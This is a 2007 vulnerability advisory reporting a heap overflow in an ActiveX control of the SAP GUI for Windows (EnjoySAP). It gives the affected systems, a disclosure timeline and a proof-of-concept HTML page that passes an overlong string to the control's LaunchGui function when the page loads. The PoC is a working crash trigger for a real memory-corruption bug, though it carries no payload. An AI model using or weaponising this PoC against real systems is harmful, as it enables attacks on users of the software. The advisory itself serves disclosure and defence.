@@ -1,0 +1,76 @@
+<!--
+=======
+Summary
+=======
+Name: EnjoySAP, SAP GUI for Windows - Heap Overflow
+Release Date:  5 July 2007
+Reference: NGS00482
+Discover: Mark Litchfield <mark@ngssoftware.com>
+Vendor: SAP
+Vendor Reference: SECRES-290
+Systems Affected: All ASCII Versions
+Risk: High
+Status: Fixed
+
+========
+TimeLine
+========
+Discovered:  4 January 2007
+Released: 19 January 2007
+Approved: 29 January 2007
+Reported: 12 January 2007
+Fixed: 27 March 2007
+Published:
+
+===========
+Description
+===========
+EnjoySAP, also know as Enjoy is the most popular SAP GUI used today.  The
+latest version can be obtained from ftp://ftp.sap.com/pub/sapgui/win/
+
+When installing EnjoySAP, in appreciation of its vast size for being a
+client (around 500MB), there are an astounding 1102 ActiveX controls
+installed.
+
+A relatively brief examinaton of these controls, found a large number of
+instances that would terminate EnjoySAP process, there were a number that
+could create files on the file system (there unfortunately exists no
+ability to inject content into these created files) and a number of
+bufferoverruns.
+
+=================
+Technical Details
+=================
+Control - rfcguisink.rfcguisink.1
+
+Function - LaunchGui
+
+POC:
+-->
+
+<HTML>
+<HEAD>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<SCRIPT type=text/javascript>
+
+function init()
+{
+var foo = "";
+
+for(var icount = 0; icount < 1800; icount++)
+{
+ foo = foo + "x";
+}
+var ngssoftware;
+ngssoftware = new ActiveXObject("rfcguisink.rfcguisink.1");
+
+ngssoftware["LaunchGui"](foo, 1, 1);
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<BODY bgColor=#ffffff onload=init()>
+</BODY></HTML>
+
+# milw0rm.com [2007-07-05]
